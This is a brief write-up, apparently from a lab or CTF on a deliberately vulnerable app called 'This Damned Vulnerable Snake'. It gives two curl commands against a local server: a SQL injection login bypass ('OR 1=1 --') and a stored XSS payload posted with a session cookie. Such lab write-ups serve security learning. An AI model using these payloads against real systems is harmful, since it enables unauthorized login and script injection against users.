---
title: This Damned Vulnerable Snake!
date: 2024-05-04
author:
  - "0x42697262"
  - Orochi
  - Jinx
---

Authors:

- 0x42697262
- Jinx
- Orochi

# This Damned Vulnerable Snake!

## TL;DR

Here are the vulnerabilities and to exploit them:

### SQL Injection

```bash
curl 'http://0.0.0.0:5000/login' -X POST --data-raw 'username=a%27+OR+1%3D1+--&password='
```

### Stored XSS

```bash
curl 'http://0.0.0.0:5000/posts' -X POST -H 'Cookie: session_token=80450346767b22c9e39e4d1e54be839b2c933d23cc043bf83bf67060eb20cd59' --data-raw 'message=%3Cscript%3Ealert%28window.origin%29%3C%2Fscript%3E'
```


Login as the first user.
This will also create a new `session_token` every time.
